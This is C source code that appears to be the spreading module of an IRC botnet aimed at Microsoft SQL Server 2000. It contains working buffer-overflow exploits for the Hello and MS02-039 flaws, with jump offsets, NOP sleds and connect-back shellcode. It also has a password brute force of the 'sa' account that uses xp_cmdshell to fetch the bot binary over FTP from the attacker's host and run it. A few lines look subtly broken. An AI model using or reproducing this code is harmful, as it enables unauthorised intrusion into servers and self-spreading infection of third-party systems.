#include "include.h"
#include "hell.h"

int usFtpdPort = RandomNumber(1024, 65535);
//!	Microsoft SQL Server Hello exploit (CAN-2002-1123)
//|
//| Bad characters: 
//| 
//| 0x00
//|
//| Shellcode space:
//|
//| 512 bytes
//|
//| Affects:
//|
//| Windows: 2000
//|
char szMMSQLRequest1 [] =
{
	"\x12\x01\x00\x34\x00\x00\x00\x00\x00\x00\x15\x00\x06\x01\x00\x1B"
	"\x00\x01\x02\x00\x1C\x00\x0C\x03\x00\x28\x00\x04\xFF\x08\x00\x02"
	"\x10\x00\x00\x00"
};

DWORD dwCallJmpEspOffsets[] = 
{
	0x42b68aba,	// Microsoft SQL Server 2000
	0x42d01e50	// MSDE 2000
};

void MSSQL(ExploitInfo_s* pExploitInfo)
{
	int iPos, iRetVal;
	char szRequestBuffer[2048], szShellcode[512];

	// Request shellcode from stack
	DWORD dwShellcodeSize = GenerateEncodedSHellcode(szShellcode, sizeof(szShellcode), 
		dwSHellcodeIpAddress, usSHellcodePort, 
		pExploit[pExploitInfo->dwExploitId].dwExploitId, "\r", sizeof("\r"));	
	
	if(!dwShellcodeSize)
		ExitThread(0);
	
	// Establish a connection to the server
	SOCKADDR_IN sinSockAddrIn;

	memset(&sinSockAddrIn, 0, sizeof(sinSockAddrIn));
	sinSockAddrIn.sin_family		= AF_INET;
	sinSockAddrIn.sin_port			= htons(pExploitInfo->usRemotePort);
	sinSockAddrIn.sin_addr.s_addr	= pExploitInfo->dwRemoteIp;

	SOCKET sSocket = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, NULL, NULL);

	// Connect to the server
	if(iRetVal = connect(sSocket, (LPSOCKADDR)&sinSockAddrIn, sizeof(sinSockAddrIn)) == -1)
		ExitThread(0);

	// the request packet size is 1195 bytes, so a 2048 bytes buffer should be enough
	iPos = 0;
	// Zero out the memory
	memset(szRequestBuffer,			0x90,						sizeof(szRequestBuffer));
	// Copy over first header
	memcpy(szRequestBuffer,			szMMSQLRequest1,			sizeof(szMMSQLRequest1) - 1);
	iPos += sizeof(szMMSQLRequest1) - 1;
	memset(szRequestBuffer + iPos,	'M',						528);
	iPos += 528;
	memcpy(szRequestBuffer + iPos,	"\x1B\xA5\xEE\x34",			4);
	iPos += 4;
	memcpy(szRequestBuffer + iPos,	"CCCC",						4);
	iPos += 4;
	// Copy over the offsets
	memcpy(szRequestBuffer + iPos,	&dwCallJmpEspOffsets[0],	4);
	iPos += 4;
	memcpy(szRequestBuffer + iPos,	&dwCallJmpEspOffsets[1],	4);
	iPos += 4;
	memcpy(szRequestBuffer + iPos,	&dwCallJmpEspOffsets[1],	4);
	iPos += 4;
	memcpy(szRequestBuffer + iPos,	"3333",						4);
	iPos += 4;
	memcpy(szRequestBuffer + iPos,	&dwCallJmpEspOffsets[1],	4);
	iPos += 4;
	memcpy(szRequestBuffer + iPos,	&dwCallJmpEspOffsets[1],	4);
	iPos += 4;
	// Generate a padding till we reached the shellcode
	memset(szRequestBuffer + iPos,	0x41,						88);
	iPos += 88;
	memset(szRequestBuffer + iPos,	0x90,						512 - dwShellcodeSize);
	iPos += 512 - dwShellcodeSize;
	// Copy over the shellcode after filling in the NOPS
	memcpy(szRequestBuffer + iPos,	szShellcode,				dwShellcodeSize);
	iPos += dwShellcodeSize;
	memcpy(szRequestBuffer + iPos,	"\x00\x24\x01\x00\x00",		5);
	iPos += 5;

	if (send(sSocket, szRequestBuffer, iPos, 0) == SOCKET_ERROR)
		ExitThread(0);

	closesocket(sSocket);
	ExitThread(1);
}

//!	MSSQL 2000 Resolution Overflow (MS02-039)
//|
//| Bad characters: 
//| 
//| 0x00 0x3A 0x0A 0x0D 0x2F 0x5C
//|
//| Shellcode space:
//|
//| 512 bytes
//|
//| Affects:
//|
//| Windows: 2000
//|
DWORD dwCallMSSQLOffsets[] = 
{
	0x42b48774,	// Microsoft SQL Server 2000
	0x7ffde0cc	// Offset to MSRPC thread storage
};

void MSSQLResolution(ExploitInfo_s* pExploitInfo)
{
	int iPos;
	// the request packet size is 800 bytes, so a 1024 bytes buffer should be enough
	char szRequestBuffer[1024];

	// Request shellcode from stack
	char szShellcode[512];
	DWORD dwShellcodeSize = GenerateEncodedSHellcode(szShellcode, sizeof(szShellcode), 
		dwSHellcodeIpAddress, usSHellcodePort, 
		pExploit[pExploitInfo->dwExploitId].dwExploitId, "/\\r\n:", sizeof("/\\r\n:"));	
	
	if(!dwShellcodeSize)
		ExitThread(0);

	// Establish a connection to the server
	SOCKADDR_IN sinSockAddrIn;

	memset(&sinSockAddrIn, 0, sizeof(sinSockAddrIn));
	sinSockAddrIn.sin_family		= AF_INET;
	sinSockAddrIn.sin_port			= htons(1434); // We can scan TCP port 1433
	sinSockAddrIn.sin_addr.s_addr	= pExploitInfo->dwRemoteIp;

	SOCKET sSocket = socket(AF_INET, SOCK_DGRAM, IPPROTO_IP);

	// Connect to the server
	if(connect(sSocket, (LPSOCKADDR)&sinSockAddrIn, sizeof(sinSockAddrIn)) == -1)
		ExitThread(0);

	//| Start building the request
	// Zero out the memory
	iPos = 0;
	memset(szRequestBuffer,				0x90,							800);
	// The first byte is 0x04, folowed by a long string of NOPS
	memset(szRequestBuffer + iPos,		0x04,							1);
	iPos += 1 + 287;
	// x68:888 followed by a NOP
	memcpy(szRequestBuffer + iPos,		"\x68\x3A\x38\x38\x38\x90",		6);
	iPos += 6;
	//| Fit the MSSQL Offsets in the package
	// Return address of jmp esp
	memcpy(szRequestBuffer + 97,		&dwCallMSSQLOffsets[0],			4);
	// 8 free bytes, usze 4 of them to define a jmp
	memcpy(szRequestBuffer + 101,		"\xEB\x69\xEB\x69",				4);
	// write to thread storage space -> msrpc
	memcpy(szRequestBuffer + 109,		&dwCallMSSQLOffsets[1],			4);
	memcpy(szRequestBuffer + 113,		&dwCallMSSQLOffsets[1],			4);
	// Write the shellcode size to the package (512)
	memcpy(szRequestBuffer + 217,		"\x35\x31\x32",					3);
	// Has to be 512 bytes, so fill the non used with NOPS
	iPos += 512 - dwShellcodeSize;
	// Copy over the shellcode to the buffer
	memcpy(szRequestBuffer + iPos,		szShellcode,					dwShellcodeSize);
	iPos += dwShellcodeSize;

	// Send the generated buffer
	if (send(sSocket, szRequestBuffer, iPos, 0) == SOCKET_ERROR)
		ExitThread(0);

	closesocket(sSocket);
	ExitThread(1);
}

//!	MSSQL UDP
char szTopOfPacket[] =
{
	"\x04"
	"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
	"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
	"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
	"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
	"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
	"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
	"\xdc\xc9\xb0\x42\x90\x90\x90\x90\x90\x90\xeb\x08\x01\x70\xae\x42"
	"\x01\x70\xae\x42"
};

void MSSQLUDP(ExploitInfo_s* pExploitInfo)
{
	char szRequestBuffer[1024], szShellcode[512];

	// Request shellcode from stack
	DWORD dwShellcodeSize = GenerateEncodedSHellcode(szShellcode, sizeof(szShellcode), 
		dwSHellcodeIpAddress, usSHellcodePort, 
		pExploit[pExploitInfo->dwExploitId].dwExploitId, "/\\r\n:", sizeof("/\\r\n:"));	
	
	if(!dwShellcodeSize)
		ExitThread(0);

	// Establish a connection to the server
	SOCKADDR_IN sinSockAddrIn;

	memset(&sinSockAddrIn, 0, sizeof(sinSockAddrIn));
	sinSockAddrIn.sin_family		= AF_INET;
	sinSockAddrIn.sin_port			= htons(1434); // We can scan TCP port 1433
	sinSockAddrIn.sin_addr.s_addr	= pExploitInfo->dwRemoteIp;

	SOCKET sSocket = socket(AF_INET, SOCK_DGRAM, IPPROTO_IP);

	// Connect to the server
	if(connect(sSocket, (LPSOCKADDR)&sinSockAddrIn, sizeof(sinSockAddrIn)) == SOCKET_ERROR)
		ExitThread(0);

	// Generate the packet causing the overflow
	int iPos = 0;
	memcpy(szRequestBuffer,		szTopOfPacket,	iPos);
	iPos += sizeof(szTopOfPacket)-1;
	memcpy(szRequestBuffer,		szShellcode,	dwShellcodeSize);
	iPos += dwShellcodeSize;

	if(send(sSocket, szRequestBuffer, iPos, 0) == SOCKET_ERROR)
		ExitThread(0);

	closesocket(sSocket);
	ExitThread(1);
}

/* MSSQL Weak Password */
void MSSQLWeakPassword(ExploitInfo_s* pExploitInfo)
{
	SQLHANDLE	hEnvironment;
	SQLHDBC		hDbc;
	HSTMT		hStmt;
	SQLCHAR		scInConnectionString[1024], szBuffer[1024], szCommand[1024];
	SWORD		sLenght;
	char		szFtpFileName[10], szDataBase[] = "", *szAuthentication[] = {
		"administrator","sa", "root", "admin", "",
			NULL
	};

	if(SQLAllocHandle(SQL_HANDLE_ENV, SQL_NULL_HANDLE, &hEnvironment) != SQL_SUCCESS)
		ExitThread(0);

	if (SQLSetEnvAttr(hEnvironment, SQL_ATTR_ODBC_VERSION, (SQLPOINTER)SQL_OV_ODBC3, SQL_IS_INTEGER) != SQL_SUCCESS)
		ExitThread(0);

	if ((SQLAllocHandle(SQL_HANDLE_DBC, hEnvironment, (SQLHDBC FAR*)&hDbc)) != SQL_SUCCESS)
		ExitThread(0);

	for (int i = 0; szAuthentication[i]; i++) 
	{
		sprintf((char*)scInConnectionString, "DRIVER={SQL Server};SERVER=%s;UID=sa;PWD=%s;%s", GetIP(pExploitInfo->dwRemoteIp), szAuthentication[i], szDataBase);

		if(SQLDriverConnect(hDbc, NULL, scInConnectionString, strlen((char *)scInConnectionString), szBuffer, 1024, &sLenght, SQL_DRIVER_COMPLETE_REQUIRED) == SQL_SUCCESS || SQL_SUCCESS_WITH_INFO)
		{
			SQLAllocStmt(hDbc, &hStmt);

			_snprintf(szFtpFileName, sizeof(szFtpFileName), "%s.txt",RandomNumber(1, 6));
			
			_snprintf((char*)szCommand, sizeof(szCommand), "EXEC master..xp_cmdshell 'echo open %s %d >> %s &echo user %s %s >> %s &echo get %s >> %s &echo quit >> %s &ftp -n -s:%s\r\n'",
				GetIP(dwSHellcodeIpAddress), usFtpdPort, szFtpFileName, 
				RandomNumber(4, 10), RandomNumber(4, 10),
				szFtpFileName, BOT->cIRC.cConf.cFileName.c_str(), szFtpFileName, szFtpFileName, 
				szFtpFileName);

			if(SQLExecDirect(hStmt, szCommand, SQL_NTS) == SQL_SUCCESS)
			{
				SQLFreeHandle(SQL_HANDLE_STMT, hStmt);
				SQLAllocStmt(hDbc, &hStmt);

				_snprintf((char*)szCommand, sizeof(szCommand), "EXEC master..xp_cmdshell 'del %s &%s &call %s'", szFtpFileName, "test.exe", "test.exe");
				
				if(SQLExecDirect(hStmt, szCommand, SQL_NTS) == SQL_SUCCESS)
				{
					pExploit[pExploitInfo->dwExploitId].iStatics++;
					goto Exception;
				}
			}
		}
	}

Exception:
	
	SQLFreeHandle(SQL_HANDLE_DBC, &hDbc);
	SQLFreeHandle(SQL_HANDLE_ENV, &hEnvironment);
	SQLFreeHandle(SQL_HANDLE_STMT, &hStmt);
	ExitThread(0);
}
